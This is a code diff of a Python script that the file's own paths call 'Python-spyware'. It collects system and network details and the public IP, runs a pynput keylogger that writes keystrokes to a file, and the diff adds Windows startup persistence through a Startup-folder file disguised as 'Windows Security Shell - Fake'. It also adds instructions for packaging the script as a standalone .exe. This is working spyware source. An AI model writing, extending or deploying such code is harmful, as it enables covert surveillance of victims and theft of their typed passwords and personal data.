@@ -1,16 +1,20 @@
-#1. System Information [Done]
-#2. Keylogger [Done]
-#3. Data to send [Done]
+#1. System Information [DONE]
+#2. Keylogger [DONE]
+#3. Data to send [DONE]
+#4. Automatic execution on system startup [DONE]
+#5. Convert code to an image/.exe application [DONE]
 
-#4. Automatic execution on system startup [Doing]
-#5. Convert code to an image/.exe application
-
-#requirements (windows)
-# execute the respective commands in a windows cmd.
+#REQUIREMENTS
+# Execute the respective commands in a cmd.
 # -> python -m pip install psutil
 # -> python -m pip install requests
 # -> python -m pip install pynput
-# -> python -m pip install --upgrade pip
+
+#REQUIREMENTS TO CREATE A .EXE
+# -> python -m pip install pyinstaller
+# -> Go to the directory of python and grab the dir of the pyinstaller.
+# -> Go to the cmd and execute the following cmd: pyinstallerdirectory --onefile main.py
+
 
 import platform
 import psutil
@@ -21,16 +25,19 @@ from time import strftime,gmtime
 import datetime
 import json
 import os
+import getpass
 
-isWindowsOS = 0
-keyloggerfiledir = "C:\\Users\\jorge.duarte\\Desktop\\Python-spyware\\output.txt"
+USER_NAME = getpass.getuser()
+IsWindowsOS = 0
+KeyLoggerFileDIR = r'C:\\Users\\%s\\Desktop\\Python-spyware\\output.txt' % USER_NAME
+startupDIR = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+startupName = 'Windows Security Shell - Fake'
+
 senddata = { 'network' : [], 'system' : '' , 'ipaddress' : '' }
-
-
 
 def ExecKeyLogger_OnKeyPress(key):
     try:
-        f=open(keyloggerfiledir,"a")
+        f=open(KeyLoggerFileDIR,"a")
         f.write(key.char)
     except AttributeError:
         if key==keyboard.Key.space:
@@ -42,7 +49,6 @@ def ExecKeyLogger_OnKeyPress(key):
     except:
       print('Failed to catch numnomeric key')
 
-
 def ExecKeyLogger_OnRelease(key):
     if int(datetime.datetime.now().strftime("%H")) not in range(8,23):
         return False
@@ -52,7 +58,7 @@ def GetExternalIP():
         ip = get('https://api.ipify.org').text
         senddata['ipaddress'] = ip
     except:
-        print 'failed to retrieve public ip'
+        senddata['ipaddress'] = 'Failed to retrive'
 
 
 def get_size(bytes, suffix="B"):
@@ -62,56 +68,32 @@ def get_size(bytes, suffix="B"):
             return str(bytes) + " " + unit + suffix;
         bytes /= factor
 
-
-
 def GetSystemInformation():
-    #print("="*40, "System Information", "="*40)
     uname = platform.uname()
     senddata['system'] = uname;
 
 def NetworkInformation():
-    #print("="*40, "Network Information", "="*40)
-    # get all network interfaces (virtual and physical)
     if_addrs = psutil.net_if_addrs()
     for interface_name, interface_addresses in if_addrs.items():
         for address in interface_addresses:
             senddata['network'].append(address);
-            #print("=== Interface: "+interface_name+" ===")
-            #if str(address.family) == '2':
-            #    if(address.address):
-            #       print("  IP Address: " + address.address)
-            #    if(address.netmask):
-            #        print("  Netmask: "+ address.netmask)
-            #    if(address.broadcast):
-            #        print("  Broadcast IP: " + address.broadcast)
-            #elif str(address.family) == '-1':
-            #    if(address.address):
-            #        print("  MAC Address: " + address.address)
-            #    if(address.netmask):
-            #        print("  Netmask: " + address.netmask)
-            #    if(address.broadcast):
-            #        print("  Broadcast MAC: " + address.broadcast)
-            #else: # family 23 == ipv6?
-            #    print(address)
-    # get IO statistics since boot
     net_io = psutil.net_io_counters()
-    #print("Total Bytes Sent: " + get_size(net_io.bytes_sent))
-    #print("Total Bytes Received: " + get_size(net_io.bytes_recv))
 
-    
-def AddToRegistry():
-    pth = os.path.dirname(os.path.realpath(__file__))
-    ##print(pth);
-    
+
+def AddToRegistry(file_path):
+    if file_path == "":
+        file_path = os.path.dirname(os.path.realpath(__file__))
+    bat_path = startupDIR %  USER_NAME
+    with open(bat_path + '\\' + startupName, "w+") as bat_file:
+        bat_file.write(r'start "" %s' % file_path)
         
 GetSystemInformation()
 NetworkInformation()
-AddToRegistry()
+AddToRegistry("")
 GetExternalIP()
 
 jstr = json.dumps(senddata, indent=4)
 print(jstr);
-
 
 #activate keylogger 
 
